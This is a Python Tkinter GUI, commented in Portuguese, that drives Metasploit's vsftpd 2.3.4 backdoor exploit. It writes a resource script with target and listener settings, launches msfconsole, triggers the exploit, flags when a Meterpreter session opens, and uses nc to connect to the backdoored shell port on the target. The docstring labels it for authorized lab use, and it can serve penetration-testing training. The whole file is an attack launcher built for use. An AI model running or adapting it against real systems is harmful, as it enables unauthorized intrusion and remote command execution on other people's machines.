#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GUI para exploit/unix/ftp/vsftpd_234_backdoor via msfconsole
- Console interativo (digita comandos direto no msf)
- Saida limpa (sem cores ANSI, sem ruido de stty)
- Botoes: Corrigir DB, Iniciar, Disparar exploit, Conectar shell (nc 6200), Parar, Clear
- Mensagem em cor de abobora quando a sessao meterpreter abre
Uso em lab autorizado.
"""

import subprocess
import tempfile
import os
import re
import queue
import threading
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext

ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]|\x1b\][^\x07]*\x07")


def clean_ansi(text):
    return ANSI_RE.sub("", text)


def clean_line(line):
    """Remove ruido: codigos ANSI e avisos do stty."""
    line = clean_ansi(line)
    if line.strip().startswith("stty:"):
        return None
    return line


class MsfVsfptpdGUI:
    CORES = {
        "verde":    "#00ff00",
        "abobora":  "#ff8c00",   # laranja abobora
        "vermelho": "#ff3333",
        "ciano":    "#00ffff",
    }

    def __init__(self, root):
        self.root = root
        self.root.title("VSFTPD 2.3.4 Backdoor - Metasploit")
        self.root.geometry("780x660")
        self.proc = None
        self.out_queue = queue.Queue()
        self.rc_path = None

        # ---------- Configuracao ----------
        frame = ttk.LabelFrame(root, text="Configuracao", padding=10)
        frame.pack(fill="x", padx=10, pady=(10, 5))

        ttk.Label(frame, text="RHOSTS (IP alvo):").grid(row=0, column=0, sticky="w", pady=3)
        self.rhosts = tk.StringVar(value="192.168.0.13")
        ttk.Entry(frame, textvariable=self.rhosts, width=26).grid(row=0, column=1, sticky="w")

        ttk.Label(frame, text="RPORT:").grid(row=0, column=2, sticky="w", padx=(15, 0))
        self.rport = tk.StringVar(value="21")
        ttk.Entry(frame, textvariable=self.rport, width=8).grid(row=0, column=3, sticky="w")

        ttk.Label(frame, text="LHOST (seu IP):").grid(row=1, column=0, sticky="w", pady=3)
        self.lhost = tk.StringVar(value="192.168.0.6")
        ttk.Entry(frame, textvariable=self.lhost, width=26).grid(row=1, column=1, sticky="w")

        ttk.Label(frame, text="LPORT:").grid(row=1, column=2, sticky="w", padx=(15, 0))
        self.lport = tk.StringVar(value="4444")
        ttk.Entry(frame, textvariable=self.lport, width=8).grid(row=1, column=3, sticky="w")

        self.force = tk.BooleanVar(value=True)
        ttk.Checkbutton(frame, text="set ForceExploit true",
                        variable=self.force).grid(row=2, column=0, columnspan=3, sticky="w")

        # ---------- Botoes ----------
        btns = ttk.Frame(root)
        btns.pack(fill="x", padx=10)

        self.btn_fix_db = ttk.Button(btns, text="Corrigir DB", command=self.fix_db)
        self.btn_fix_db.pack(side="left", padx=5)

        self.btn_run = ttk.Button(btns, text="Iniciar msfconsole", command=self.run)
        self.btn_run.pack(side="left", padx=5)

        self.btn_exploit = ttk.Button(btns, text="Disparar exploit", command=self.send_exploit,
                                      state="disabled")
        self.btn_exploit.pack(side="left", padx=5)

        self.btn_shell = ttk.Button(btns, text="Conectar shell (nc 6200)", command=self.connect_backdoor)
        self.btn_shell.pack(side="left", padx=5)

        self.btn_stop = ttk.Button(btns, text="Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=5)

        self.btn_clear = ttk.Button(btns, text="Clear", command=self.clear)
        self.btn_clear.pack(side="right", padx=5)

        # ---------- Saida ----------
        out_frame = ttk.LabelFrame(root, text="Console msf", padding=5)
        out_frame.pack(fill="both", expand=True, padx=10, pady=(5, 5))

        self.output = scrolledtext.ScrolledText(out_frame, bg="black", fg="lime",
                                                insertbackground="lime",
                                                font=("Consolas", 9), state="disabled")
        self.output.pack(fill="both", expand=True)

        # ---------- Entrada de comandos ----------
        cmd_frame = ttk.Frame(root)
        cmd_frame.pack(fill="x", padx=10, pady=(0, 10))

        ttk.Label(cmd_frame, text="msf >").pack(side="left")
        self.cmd_entry = ttk.Entry(cmd_frame, font=("Consolas", 10))
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.cmd_entry.bind("<Return>", self.send_cmd)
        self.btn_send = ttk.Button(cmd_frame, text="Enviar", command=self.send_cmd, state="disabled")
        self.btn_send.pack(side="left")

        self.root.after(100, self.poll_output)

    # ---------------- util ----------------
    def log(self, text, cor=None):
        filtered = []
        for line in text.splitlines(keepends=True):
            c = clean_line(line)
            if c is not None:
                filtered.append(c)
        if not filtered:
            return
        self.output.configure(state="normal")
        if cor and cor in self.CORES:
            tag = f"cor_{cor}"
            self.output.tag_configure(tag, foreground=self.CORES[cor])
            self.output.insert(tk.END, "".join(filtered), tag)
        else:
            self.output.insert(tk.END, "".join(filtered))
        self.output.see(tk.END)
        self.output.configure(state="disabled")

    def clear(self):
        self.output.configure(state="normal")
        self.output.delete("1.0", tk.END)
        self.output.configure(state="disabled")

    def poll_output(self):
        try:
            while True:
                item = self.out_queue.get_nowait()
                # item pode ser (texto) ou (texto, cor)
                if isinstance(item, tuple):
                    self.log(item[0], item[1])
                else:
                    self.log(item)
        except queue.Empty:
            pass
        self.root.after(100, self.poll_output)

    # ---------------- acoes ----------------
    def fix_db(self):
        self.log("[*] Corrigindo collation do banco 'msf'...\n")
        cmd = ["sudo", "-u", "postgres", "psql", "-d", "msf",
               "-c", "ALTER DATABASE msf REFRESH COLLATION VERSION;"]
        threading.Thread(target=self._run_sub, args=(cmd,), daemon=True).start()

    def _run_sub(self, cmd):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            self.root.after(0, self.log, r.stdout + r.stderr + "\n")
        except Exception as e:
            self.root.after(0, self.log, f"[!] Erro: {e}\n")

    def build_script(self):
        rc = "use exploit/unix/ftp/vsftpd_234_backdoor\n"
        rc += f"set RHOSTS {self.rhosts.get().strip()}\n"
        rc += f"set RPORT {self.rport.get().strip()}\n"
        rc += f"set LHOST {self.lhost.get().strip()}\n"
        rc += f"set LPORT {self.lport.get().strip()}\n"
        if self.force.get():
            rc += "set ForceExploit true\n"
        rc += "exploit\n"
        return rc

    def run(self):
        for field, name in ((self.rhosts, "RHOSTS"), (self.lhost, "LHOST")):
            if not field.get().strip():
                messagebox.showerror("Erro", f"Campo {name} obrigatorio.")
                return
        for field, name in ((self.rport, "RPORT"), (self.lport, "LPORT")):
            if not field.get().strip().isdigit():
                messagebox.showerror("Erro", f"{name} deve ser numerico.")
                return

        fd, self.rc_path = tempfile.mkstemp(suffix=".rc", prefix="vsftpd_exploit_")
        with os.fdopen(fd, "w") as f:
            f.write(self.build_script())

        self.log(f"[*] Resource: {self.rc_path}\n[*] Iniciando msfconsole...\n\n")

        env = os.environ.copy()
        env["MSF_NO_COLOR"] = "1"
        env["TERM"] = "dumb"

        cmd = ["msfconsole", "-q", "-r", self.rc_path]
        try:
            self.proc = subprocess.Popen(cmd, stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT,
                                         text=True, bufsize=1, env=env)
        except FileNotFoundError:
            messagebox.showerror("Erro", "msfconsole nao encontrado no PATH.")
            os.unlink(self.rc_path)
            return

        self.btn_run.configure(state="disabled")
        self.btn_send.configure(state="normal")
        self.btn_stop.configure(state="normal")
        self.cmd_entry.focus()

        threading.Thread(target=self.read_output, daemon=True).start()

    def read_output(self):
        for line in self.proc.stdout:
            self.out_queue.put(line)

            # detecta sessao meterpreter aberta -> mensagem em cor de abobora
            if "Meterpreter session" in line and "opened" in line:
                self.out_queue.put(("\nOK, TUDO CERTO! Sessão aberta — digite algo no campo abaixo. ou comando help\n\n",
                                    "abobora"))
                self.root.after(0, self._foco_cmd)

        self.proc.wait()
        self.out_queue.put(f"\n[*] msfconsole finalizado (codigo {self.proc.returncode})\n")
        if self.rc_path:
            try:
                os.unlink(self.rc_path)
            except OSError:
                pass
        self.root.after(0, lambda: (self.btn_run.configure(state="normal"),
                                    self.btn_send.configure(state="disabled"),
                                    self.btn_stop.configure(state="disabled"),
                                    self.btn_exploit.configure(state="disabled")))

    def _foco_cmd(self):
        try:
            self.root.bell()
        except Exception:
            pass
        self.cmd_entry.focus()

    def send_cmd(self, event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd or not self.proc or self.proc.poll() is not None:
            return
        self.cmd_entry.delete(0, tk.END)
        self.log(f"msf > {cmd}\n")
        try:
            self.proc.stdin.write(cmd + "\n")
            self.proc.stdin.flush()
        except Exception as e:
            self.log(f"[!] Falha ao enviar comando: {e}\n", cor="vermelho")

    def send_exploit(self):
        if not self.proc or self.proc.poll() is not None:
            return
        self.log("msf > exploit\n")
        try:
            self.proc.stdin.write("exploit\n")
            self.proc.stdin.flush()
        except Exception as e:
            self.log(f"[!] Falha: {e}\n", cor="vermelho")

    def connect_backdoor(self):
        """Conecta direto na backdoor ja ativa (porta RPORT+1) via nc interativo."""
        target = self.rhosts.get().strip()
        port = str(int(self.rport.get().strip()) + 1)
        self.log(f"[*] Conectando à backdoor {target}:{port} (janela de terminal separada)...\n", cor="ciano")

        def worker():
            cmd = ["xterm", "-hold", "-title", f"Backdoor shell {target}:{port}",
                   "-e", f"nc {target} {port}"]
            try:
                subprocess.Popen(cmd)
            except FileNotFoundError:
                try:
                    r = subprocess.run(["nc", target, port], capture_output=True,
                                       text=True, timeout=10)
                    self.root.after(0, self.log, (r.stdout or "") + (r.stderr or "") + "\n")
                except subprocess.TimeoutExpired:
                    self.root.after(0, self.log,
                                    f"[*] Conexao aberta em {target}:{port} (sem shell de saida; use xterm).\n")
                except Exception as e:
                    self.root.after(0, self.log, f"[!] Erro nc: {e}\n", cor="vermelho")

        threading.Thread(target=worker, daemon=True).start()

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.stdin.write("exit\n")
                self.proc.stdin.flush()
            except Exception:
                self.proc.terminate()
            self.log("\n[!] Encerrando msfconsole...\n", cor="abobora")


if __name__ == "__main__":
    root = tk.Tk()
    app = MsfVsfptpdGUI(root)
    root.mainloop()
